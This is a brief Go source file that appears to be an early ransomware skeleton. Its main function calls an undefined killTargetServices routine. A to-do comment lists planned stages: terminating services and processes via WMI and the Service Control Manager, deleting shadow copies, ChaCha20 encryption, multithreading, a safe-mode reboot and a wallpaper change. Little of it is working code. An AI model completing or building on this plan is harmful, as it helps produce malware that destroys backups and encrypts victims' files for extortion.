package main

import (
	"fmt"
	"math/rand"
	"time"
)

func main() {
	rand.Seed(time.Now().UnixNano())
	err := killTargetServices([]uint32{1, 23})
	if err != nil {
		fmt.Println(err.Error())
	}
}

// Things to do:
// - Command line arguments
// Pre-Encryption:
// - Cryptographic Keys Setup

// - Terminating Services and Processes through WMI
// - Terminating Services through Service Control Manager
// - Terminating Processes
// - Deleting Shadow Copies
// - ChaCha20
// - Multithreading

// things to do last
// - Safemood Reboot
// - wallpaper
